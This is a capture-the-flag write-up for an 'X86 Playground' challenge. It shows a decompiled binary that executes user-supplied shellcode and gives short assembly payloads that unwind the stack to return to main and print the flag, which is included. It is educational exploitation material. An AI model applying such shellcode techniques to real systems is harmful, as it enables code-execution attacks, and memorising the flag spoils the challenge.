# X86 Playground

## Challenge

Author: Desp

Let’s see how creative you can be in coming up with shellcodes!

Connect with nc 1337.maplebacon.org 1337 and provide the payload you designed.

## Walkthrough

We are given a binary in which you are stuck in the function `run` with the ability to run arbitrary shellcode. The goal is to escape the `run` function and return to `main`.

```c
int main() {
    run();
    printf("How\'d you get here???\nWell I guess I can give you an easter egg then: ");
    puts(flag);
}

void run() {
    uchar shellcode [25];
    while(true) {
        printf("Enter your shellcode in hex (invalid hexits will be replaced with 0s): ");
        hexinput(shellcode,0x14);
        (*(code *)shellcode)();
        puts("Hm, that doesn\'t seem to do anything much does it? (Hint: think about how functions are se t up in memory)");
    }
}
```

To return, you have to correctly clean up the stack and return from the function.

```asm
add rsp, 0x48
pop rbp
ret
```

Thanks to my teammate Ayna who was looking over my shoulder and pointed out I was using `esp`, forgot `rdp`, and introduced me to the `leave` x86 instruction lol. It had been a long day of travel to New York.

```asm
leave
ret
```

## Solve

`maple{h4rml3ss_sh3llc0d3?}`
